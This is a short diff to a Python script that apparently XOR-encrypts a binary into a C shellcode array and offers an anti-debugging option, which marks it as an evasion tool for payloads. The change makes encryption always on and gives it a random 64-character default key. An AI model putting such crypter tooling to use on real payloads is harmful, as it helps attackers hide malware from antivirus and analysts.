@@ -2,7 +2,15 @@ import binascii
 import argparse
 import subprocess
 import random
+import string
 import os
+
+def genString(length):
+    randString = ''
+    for i in range(length):
+        randString += random.choice(list(string.ascii_letters + string.digits))
+
+    return randString
 
 def init_args():
     parser = argparse.ArgumentParser(
@@ -14,7 +22,7 @@ def init_args():
                         required=True)
 
     parser.add_argument('-x', '--xor', help='XOR key to encrypt with', 
-                        default='')
+                        default=genString(64))
 
     parser.add_argument('-ad', '--anti-debug', help='Enable anti debugging option', 
                         dest='debug', 
@@ -86,10 +94,9 @@ void antiDebug()
         with open(args.bin, 'rb') as f:
             binData = f.read()
 
-        if args.xor:
-            binData = xor(bytearray(binData), args.xor.encode())
-            # print(binData)
-            # quit()
+        binData = xor(bytearray(binData), args.xor.encode())
+        # print(binData)
+        # quit()
 
         stringConstruct = "unsigned char shellcode[] = \n\""
 
